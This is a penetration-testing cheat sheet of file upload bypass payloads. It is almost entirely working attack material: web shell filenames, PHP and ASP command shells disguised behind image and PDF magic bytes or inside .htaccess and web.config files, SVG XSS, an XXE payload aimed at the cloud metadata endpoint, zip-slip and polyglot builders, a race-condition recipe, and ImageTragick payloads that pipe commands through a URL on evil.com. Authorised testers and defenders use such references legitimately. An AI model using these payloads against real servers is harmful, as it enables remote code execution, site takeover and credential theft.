## ============================================================
## File Upload Bypass Techniques — VAPT Reference
## ============================================================

## ---- EXTENSION BYPASS ----
## Double extensions
shell.php.jpg
shell.php.png
shell.php.gif
shell.php.pdf
shell.asp.jpg

## Alternate extensions (PHP)
shell.php3
shell.php4
shell.php5
shell.php7
shell.pht
shell.phtml
shell.phar
shell.phps
shell.pgif
shell.shtml
shell.inc

## Alternate extensions (ASP/ASPX)
shell.asp
shell.aspx
shell.ashx
shell.asmx
shell.cer
shell.asa
shell.cshtml
shell.config

## Alternate extensions (JSP)
shell.jsp
shell.jspx
shell.jsw
shell.jsv
shell.jspf

## Null byte injection (PHP < 5.3.4)
shell.php%00.jpg
shell.php\x00.jpg
shell.php%00.png

## Case manipulation
shell.pHp
shell.PhP
shell.PHP
shell.Asp
shell.aSPx

## Trailing characters
shell.php.
shell.php..
shell.php...
shell.php;.jpg
shell.php%0a
shell.php%0d%0a
shell.php/
shell.php.\

## Unicode / special characters
shell.p%68p
shell.%70hp

## ---- CONTENT-TYPE BYPASS ----
## Change Content-Type header to allowed MIME types
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
Content-Type: application/pdf
Content-Type: application/octet-stream
Content-Type: text/plain
Content-Type: image/svg+xml

## ---- MAGIC BYTES / FILE SIGNATURES ----
## Prepend valid file signatures before shell code

# GIF
GIF87a
<?php system($_GET['cmd']); ?>

GIF89a
<?php system($_GET['cmd']); ?>

# JPEG (hex: FF D8 FF E0)
# Prepend bytes: \xff\xd8\xff\xe0 before PHP code

# PNG (hex: 89 50 4E 47 0D 0A 1A 0A)
# Prepend bytes: \x89\x50\x4e\x47\x0d\x0a\x1a\x0a before PHP code

# PDF
%PDF-1.5
<?php system($_GET['cmd']); ?>

# BMP (hex: 42 4D)
# Prepend bytes: \x42\x4d before PHP code

## Python one-liner to prepend magic bytes
# python -c "open('shell.php.png','wb').write(b'\x89PNG\r\n\x1a\n'+open('shell.php','rb').read())"

## ---- .HTACCESS UPLOAD ----
## Upload .htaccess to make server parse .jpg as PHP
## File: .htaccess
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .png
AddType application/x-httpd-php .gif

## Or override handler
<FilesMatch "\.jpg$">
    SetHandler application/x-httpd-php
</FilesMatch>

## ---- WEB.CONFIG UPLOAD (IIS) ----
## File: web.config
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="web_config" path="*.config" verb="*"
           modules="IsapiModule"
           scriptProcessor="%windir%\system32\inetsrv\asp.dll"
           resourceType="Unspecified"
           requireAccess="Write" preCondition="bitness64" />
    </handlers>
    <security>
      <requestFiltering>
        <fileExtensions>
          <remove fileExtension=".config" />
        </fileExtensions>
        <hiddenSegments>
          <remove segment="web.config" />
        </hiddenSegments>
      </requestFiltering>
    </security>
  </system.webServer>
</configuration>
<!--
<%
Response.Write("CMD: " & Request("cmd"))
Set objShell = CreateObject("WScript.Shell")
Set objExec = objShell.Exec("cmd /c " & Request("cmd"))
Response.Write(objExec.StdOut.ReadAll())
%>
-->

## ---- SVG XSS + SSRF ----
## File: payload.svg
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg onload="alert(document.domain)" xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="20">XSS via SVG</text>
</svg>

## SVG SSRF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>

## ---- POLYGLOT FILES ----
## JPEG/PHP polyglot (exiftool)
# exiftool -Comment="<?php system(\$_GET['cmd']); ?>" image.jpg
# mv image.jpg image.php.jpg

## PNG/PHP polyglot
# python -c "
# import struct
# png_header = b'\x89PNG\r\n\x1a\n'
# ihdr = struct.pack('>I',13) + b'IHDR' + struct.pack('>II',1,1) + b'\x08\x02\x00\x00\x00'
# payload = b'<?php system(\$_GET[\"cmd\"]); ?>'
# open('poly.png','wb').write(png_header + ihdr + payload)
# "

## ---- SIZE / DIMENSION BYPASS ----
## If server checks image dimensions, use valid tiny images
## 1x1 pixel GIF with appended PHP
# GIF89a + 1x1 pixel data + <?php payload ?>

## ---- RACE CONDITION ----
## Upload + access before server deletes the file
## 1. Start uploading shell.php
## 2. Immediately send GET /uploads/shell.php?cmd=id in parallel
## Tools: Turbo Intruder, custom Python script with threading

## ---- ZIP/TAR SLIP ----
## Upload archive that extracts to web root
# python -c "
# import zipfile
# z = zipfile.ZipFile('slip.zip','w')
# z.write('cmd.php','../../cmd.php')
# z.close()
# "

## ---- IMAGEMAGICK EXPLOITS (ImageTragick CVE-2016-3714) ----
## File: exploit.mvg
push graphic-context
viewbox 0 0 640 480
fill 'url(https://evil.com/img.png"|id")'
pop graphic-context

## File: exploit.svg
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="640px" height="480px">
  <image xlink:href="https://evil.com/img.png&quot;|id &quot;" x="0" y="0" height="640px" width="480px"/>
</svg>
